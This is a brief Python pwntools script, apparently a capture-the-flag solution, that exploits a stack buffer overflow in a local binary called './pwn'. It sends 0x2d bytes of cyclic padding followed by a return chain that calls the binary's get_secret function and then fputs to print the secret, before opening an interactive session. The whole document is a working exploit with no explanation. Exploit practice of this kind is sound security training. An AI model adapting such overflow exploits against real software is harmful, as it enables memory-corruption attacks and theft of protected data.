from pwn import *

io = process('./pwn')
elf = ELF('./pwn')

payload = cyclic(0x2d) + p32(elf.symbols['get_secret']) + p32(elf.symbols['fputs']) + p32(0xdeadbeef) + p32(0x80ECA2D) + p32(1)

io.sendline(payload)

io.interactive()